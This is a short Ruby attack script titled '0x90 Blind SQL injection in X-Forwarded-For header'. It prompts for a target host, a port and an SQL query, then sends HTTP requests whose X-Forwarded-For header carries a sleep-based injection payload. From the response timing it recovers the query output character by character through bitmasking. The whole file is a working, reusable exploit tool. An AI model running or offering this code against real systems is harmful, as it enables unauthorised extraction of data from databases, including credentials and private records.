require 'socket'
line = "================================================="

puts line
puts "0x90 Blind SQL injection in X-Forwarded-For header"
puts line
puts "What is the targets IP adress or base DNS? "
target = $stdin.gets.chomp
puts "On what port is the target listening? "
port = $stdin.gets.chomp
puts "what SQL command would you like to inject? "
inj = $stdin.gets.chomp
puts line

puts "Starting Bitmasked Blind Timebased SQLi in X-Forwarded-For header of #{target} on port #{port}"
puts line


#inj = "#{computer}"
str = ""
 
def test(sql,target,port)
  p = "hacker' or if((#{sql}),sleep(0.4),0) and '1'='1"
  t = Time.now
  begin
    s = TCPSocket.new("#{target}",port)
    s.write("GET / HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: #{p}\r\nConnection: close\r\n\r\n")
    s.readlines()
    s.close
  rescue Errno::ECONNRESET, EOFError
  end
  return ((Time.now-t)>0.5)
end

# dummy initialisation for the while loop
# we loop until the returned value is null
value = 1
i = 0

while value != 0
  # i is the position in the string
  i+=1
  # initialise to 0 the value we are trying to retrieve
  value = 0
  # for each bit
  0.upto(6) do |bit|
    # 2**bit is 2^bit and will do all the bit masking work
    sql = "select ascii(substring((#{inj}),#{i},1))&#{2**bit}"
    if test(sql, target, port)
      # if the returned value is true
      # we add the mask to the current_value
      value+=2**bit
    end
  end
  # value is an ascii value, we get the corresponding character
  # using the `.chr` ruby function
  str+= value.chr
  puts str
end
